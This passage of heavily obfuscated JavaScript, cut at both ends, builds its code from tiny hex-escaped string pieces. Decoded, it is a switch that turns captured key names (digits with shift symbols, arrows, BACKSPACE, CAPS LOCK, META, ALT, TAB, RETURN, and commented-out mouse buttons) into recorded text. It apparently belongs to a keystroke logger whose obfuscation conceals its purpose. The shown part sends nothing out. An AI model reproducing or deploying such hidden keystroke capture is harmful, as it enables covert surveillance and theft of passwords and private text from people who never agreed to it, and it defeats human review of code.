+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'!\x22'+'\x20:'+'\x20\x22'+'1\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x222'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'@\x22'+'\x20:'+'\x20\x22'+'2\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x223'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'#\x22'+'\x20:'+'\x20\x22'+'3\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x224'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'$\x22'+'\x20:'+'\x20\x22'+'4\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x225'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'%\x22'+'\x20:'+'\x20\x22'+'5\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x226'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'^\x22'+'\x20:'+'\x20\x22'+'6\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x227'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'&\x22'+'\x20:'+'\x20\x22'+'7\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x228'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'*\x22'+'\x20:'+'\x20\x22'+'8\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x229'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi')+('ft'+'\x20?'+'\x20\x22'+'(\x22'+'\x20:'+'\x20\x22'+'9\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x220'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+')\x22'+'\x20:'+'\x20\x22'+'0\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22S'+'PA'+'CE'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'\x20\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22L'+'EF'+'T\x20'+'AR'+'RO'+'W\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22<'+'LA'+'>\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22R'+'IG'+'HT'+'\x20A'+'RR'+'OW'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'<R'+'A>'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'BA'+'CK'+'SP'+'AC'+'E\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22<'+'BS'+'>\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22U'+'P\x20'+'AR'+'RO'+'W\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22<'+'UA'+'>\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22D'+'OW'+'N\x20'+'AR'+'RO'+'W\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22<'+'DA'+'>\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22C'+'AP'+'S\x20'+'LO'+'CK'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'<C'+'L>'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'SQ'+'UA'+'RE'+'\x20B'+'RA'+'CK'+'ET'+'\x20O'+'PE'+'N\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'sh'+'if'+'t\x20'+'?\x20'+'\x22{'+'\x22\x20'+':\x20'+'\x22['+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'SQ'+'UA'+'RE'+'\x20B'+'RA'+'CK'+'ET'+'\x20C'+'LO'+'SE'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'}\x22'+'\x20:'+'\x20\x22'+']\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20')+('\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22M'+'OU'+'SE'+'\x20L'+'EF'+'T\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'//'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'<M'+'L>'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'MO'+'US'+'E\x20'+'RI'+'GH'+'T\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'//'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'<M'+'R>'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'MO'+'US'+'E\x20'+'MI'+'DD'+'LE'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20/'+'/\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22<'+'MR'+'>\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22M'+'IN'+'US'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'_\x22'+'\x20:'+'\x20\x22'+'-\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22E'+'QU'+'AL'+'S\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'sh'+'if'+'t\x20'+'?\x20'+'\x22+'+'\x22\x20'+':\x20'+'\x22='+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'EN'+'D\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22<'+'EN'+'D>'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'AL'+'T\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22<'+'AL'+'T>'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'TA'+'B\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22<'+'TA'+'B>'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'PA'+'GE'+'\x20U'+'P\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22<'+'PU'+'>\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22P'+'AG'+'E\x20'+'DO'+'WN'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'<P'+'D>'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'HO'+'ME'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20')+('\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'<H'+'OM'+'E>'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'LE'+'FT'+'\x20A'+'LT'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'<L'+'-A'+'LT'+'>\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22R'+'IG'+'HT'+'\x20A'+'LT'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'<R'+'-A'+'LT'+'>\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22E'+'SC'+'AP'+'E\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22<'+'ES'+'P>'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ca'+'se'+'\x20\x22'+'LE'+'FT'+'\x20M'+'ET'+'A\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22<'+'L-'+'ME'+'TA'+'>\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22R'+'IG'+'HT'+'\x20M'+'ET'+'A\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22<'+'R-'+'ME'+'TA'+'>\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22D'+'EL'+'ET'+'E\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22<'+'DE'+'LE'+'TE'+'>\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22S'+'EM'+'IC'+'OL'+'ON'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+':\x22'+'\x20:'+'\x20\x22'+';\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22R'+'ET'+'UR'+'N\x22'+':\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'\x22\x5c'+'n\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22Q'+'UO'+'TE'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x27'+'\x22\x27'+'\x20:'+'\x20\x22'+'\x27\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22S'+'EC'+'TI'+'ON'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'~\x22'+'\x20:'+'\x20\x22'+'`\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20')+('\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22D'+'OT'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'>\x22'+'\x20:'+'\x20\x22'+'.\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\